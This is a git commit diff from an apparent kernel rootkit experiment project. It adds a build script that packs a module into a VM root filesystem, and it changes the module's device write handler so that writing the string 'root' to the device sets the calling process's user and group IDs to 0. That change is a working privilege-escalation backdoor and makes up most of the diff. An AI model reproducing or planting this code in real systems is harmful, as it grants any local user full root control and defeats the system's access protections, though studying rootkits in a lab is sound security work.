21a2495444c9408aeed28c5207d0c789d0f6c9eb
peiandhao <2689271477@qq.com>
2025-01-04 11:30:10 +0800

    基础提权

---
+++ rootkit/experiment_0/baby_vm/build.sh
@@ -0,0 +1,4 @@
+#!/bin/bash
+cp ../pwhrootkit.ko ./fs_extract/
+cd fs_extract
+find . | cpio -o --format=newc >../rootfs.cpio
--- rootkit/experiment_0/rootkitops.c
+++ rootkit/experiment_0/rootkitops.c
@@ -1,14 +1,28 @@
 #include "pwhrootkit.h" 
+#include <linux/uaccess.h>
 
 static ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t count, loff_t * ppos){
     return 0;
 }
 static ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
-    return 1;
+    static char user_data[0x100];
+    struct cred * cur_cred;
+    size_t size = count > 0x100 ? 0x100 : count;
+    int flags;
+    flags = copy_from_user(user_data, buf, size);
+    if(!strncmp(user_data, "root", 4)){
+        printk(KERN_INFO "WRITING...");
+        cur_cred = (struct cred *)current->cred;
+        cur_cred->uid = cur_cred->euid = cur_cred->suid = cur_cred->fsuid = KUIDT_INIT(0);
+        cur_cred->gid = cur_cred->egid = cur_cred->sgid = cur_cred->fsgid = KGIDT_INIT(0);
+
+    }
+    return size;
 }
 static long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
     return 2;
 }
+/* 打开类容 */
 static int pwh_rootkit_open(struct inode *inode, struct file *file){
     return 0;
 }
